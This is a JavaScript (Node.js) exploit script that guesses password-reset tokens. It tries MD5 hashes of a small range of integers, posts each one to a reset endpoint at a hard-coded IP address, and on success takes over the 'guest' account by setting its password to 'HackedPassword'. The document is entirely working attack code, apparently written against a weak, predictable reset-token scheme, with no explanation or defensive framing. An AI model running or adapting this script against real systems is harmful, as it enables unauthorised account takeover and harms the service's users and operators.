const axios = require('axios');
const crypto = require('crypto');
const querystring = require('querystring');

const targetURL = 'http://192.241.137.10:4000/reset_password/reset_password'; // Endpoint for resetting password

async function exploit() {
    try {
        for (let i = 1000; i <= 1010; i++) { // Assuming a range of possible hash values
            const generatedHash = crypto.createHash('md5').update(String(i)).digest('hex');

            try {
                console.log('Trying hash:', generatedHash); // Log the hash being tried

                const payload = {
                    hash: generatedHash,
                    newPassword: 'HackedPassword'
                };

                const formData = querystring.stringify(payload);

                const response = await axios.post(targetURL, formData, {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Connection': 'close',
                        // Add other necessary headers as needed
                    }
                });

   //             console.log('Response status:', response.status); // Log the response status

                if (response.data === 'Password changed successfully') {
                    console.log('Reset hash found:', generatedHash);
                    console.log('Password changed for user:', 'guest');
                    return; // Exit loop if a valid hash is found
                }
            } catch (error) {
     //           console.error('Request error:', error); // Log specific request error
                // Handle errors based on specific error codes or log them for debugging
            }
        }
        console.log('Failed to find a valid hash.');
    } catch (err) {
        console.error('Exploit failed:', err); // Log any unexpected errors during exploitation
    }
}

// Execute the exploit function
exploit();
